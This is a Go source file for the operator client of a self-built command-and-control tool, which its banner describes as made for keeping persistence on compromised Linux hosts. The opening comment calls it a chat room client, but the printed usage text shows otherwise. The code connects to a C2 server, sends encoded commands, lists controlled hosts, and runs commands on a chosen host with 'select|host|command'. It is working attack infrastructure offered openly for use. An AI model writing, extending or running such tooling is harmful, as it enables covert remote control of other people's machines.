// one sever to more client chat room
//This is chat client
package main

import (
	"C2_Linx/encode"
	"bufio"
	//"io"
	//"log"

	//"encoding/base32"
	"fmt"
	"net"
	"os"
	//"strings"
)

var master string = ""  //声明聊天室的昵称

func main() {
	fmt.Println("")
	fmt.Println("使用方法:  ")
	fmt.Println("        1、先输入服务端ip和端口进行连接，然后随意先创建用户： Make a mastername:xxx")
	fmt.Println("")

	//fmt.Println("        2、展示c2：        shell>>show")
	//fmt.Println("        3、执行命令方法:   shell>>select|c2主机名字|命令")
	fmt.Println("                                          一款专门用于linux维权的C2自研工具")
	fmt.Println("                                          by  aufeng     v1.0")
	fmt.Println("")
	fmt.Println("连接服务器    输入示例  1.2.3.4:8888")
	fmt.Println("               ↓")
	fmt.Print("please enter : ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	input := scanner.Text()
	conn, err := net.Dial("tcp", input)  //打开监听端口
	//conn, err := net.Dial("tcp", "192.168.126.1:8888")  //打开监听端口
	if err != nil {
		fmt.Println("conn fail...")
	}
	defer conn.Close()
	fmt.Println("master connect server successed \n")

	//给自己取一个聊天室的昵称
	fmt.Printf("Make a mastername:")
	fmt.Scanf("%s", &master)  //输入昵称
	ver :=encode.Enc("addmaster|" + master)
	conn.Write([]byte(ver))  //将信息发送给服务器端
	//ver :=enc("addmaster|" + master)
	//conn.Write([]byte("addmaster|" + master))  //将信息发送给服务器端

	fmt.Println("")
	fmt.Println("使用方法: ")
	fmt.Println("        2、展示c2：        shell>>show")
	fmt.Println("        3、执行命令方法:   shell>>select|c2主机名字|命令")
	fmt.Println("        4、检查存活:       shell>>checkalive")
	fmt.Println("        5、帮助:               shell>>help")
	fmt.Println("        6、查看历史c2连接记录:  shell>>history")

	fmt.Println("")

	fmt.Print("shell >> ")

	go Handle(conn)  //创建线程

	//var msg string
	for {
		//msg := ""  //声明一个空的消息
		//fmt.Scan(&msg)  //输入消息
		////conn.Write([]byte("master|" + nick + "|" + msg))  //三段字节流 say | 昵称 | 发送的消息
		////conn.Write([]byte("master|" + msg))  //三段字节流 say | 昵称 | 发送的消息
		//conn.Write([]byte(msg))  //三段字节流 say | 昵称 | 发送的消息
		//fmt.Print("shell >> ")

		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			msg := scanner.Text()
			//conn.Write([]byte((msg)))
			if msg == "help"{
				fmt.Println("")
				fmt.Println("使用方法: ")
				fmt.Println("        2、展示c2：        shell>>show")
				fmt.Println("        3、执行命令方法:   shell>>select|c2主机名字|命令")
				fmt.Println("        4、检查存活:       shell>>checkalive")
				fmt.Println("        5、帮助:           shell>>help")
				fmt.Println("        6、查看历史c2连接记录:  shell>>history")
				fmt.Println("")
				fmt.Print("shell >> ")
				continue
			}else {
				conn.Write([]byte(encode.Enc(msg)))
			}
		}
		//if msg == "quit" {  //如果消息为quit
		//	conn.Write([]byte("quit|" + msg))  //将quit字节流发送给服务器端
		//	break  //程序结束运行
		//}
	}
}

func Handle(conn net.Conn) {

	for {

		data := make([]byte, 1024)  //创建一个字节流
		//msg_read, err := conn.Read(data)  //将读取的字节流赋值给msg_read和err
		//if err != nil {
		//	if err == io.EOF {
		//		break
		//	}
		//	fmt.Println(err)
		//}
		////if msg_read == 0 || err != nil {  //如果字节流为0或者有错误
		////	break
		////}
		//
		//fmt.Println(string(data[0:msg_read]))  //把字节流转换成字符串
		var message []byte
		for {
			n, err := conn.Read(data)
			if err != nil {
				fmt.Println("Error reading message:", err)
				return
			}

			message = append(message, data[:n]...)

			if len(message) >= 1024*1024 {
				fmt.Println("Message length exceeds the maximum allowed limit.")
				return
			}

			if n < len(data) {
				break
			}
		}
		fmt.Println(string(message))
		fmt.Println("")
		//fmt.Println("使用方法:  ")
		//fmt.Println("        展示c2：  shell>>show")
		//fmt.Println("        执行命令方法:   shell>>select|c2主机名字|命令")
		//fmt.Println("")
		//fmt.Println("")
		fmt.Print("shell >> ")

	}
}
